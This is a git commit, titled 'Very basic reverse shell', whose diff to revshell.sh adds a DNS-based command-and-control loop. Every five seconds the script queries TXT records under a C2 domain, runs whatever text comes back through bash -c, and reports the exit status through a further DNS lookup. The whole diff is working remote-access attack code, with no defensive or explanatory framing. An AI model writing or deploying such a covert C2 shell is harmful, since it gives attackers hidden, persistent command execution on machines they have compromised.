273134ec721e569db1f6e9f8689370a7706d7f97
Jon Bakies <jon@baki.es>
2018-04-14 14:23:49 -0400

    Very basic reverse shell

--- revshell.sh
+++ revshell.sh
@@ -3,13 +3,18 @@
 # This script checks for new commands from a c2 module running on the nameserver
 # checks every 5 seconds and responds to the ns with the command output
 
-origin=$(echo "c2." "$2" | sed 's/ //g' | sed 's/\.\././g') 
-uniqid=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 10 | head -n 1)
+origin=$(echo ".c2." "$1" | sed 's/ //g' | sed 's/\.\././g') 
+uniqid=$(cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 5 | head -n 1)
 
 while true ; do 
 	
-	randprefix=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 10 | head -n 1)
-	dig +short "$randprefix$uniqid$origin" 
+	randprefix=$(cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 10 | head -n 1)
+	echo "$randprefix.$uniqid$origin"
+	cmd=$(dig +short "$randprefix.$uniqid$origin" TXT | sed s/^\"// | sed s/\"$//)
+	echo "Running $cmd"
+	bash -c "$cmd"
+	echo "Exit status: $?.$uniqid.$randprefix.ack$origin"
+	dig "$?.$uniqid.$randprefix.ack$origin" TXT +short
 
 	sleep 5 
 done
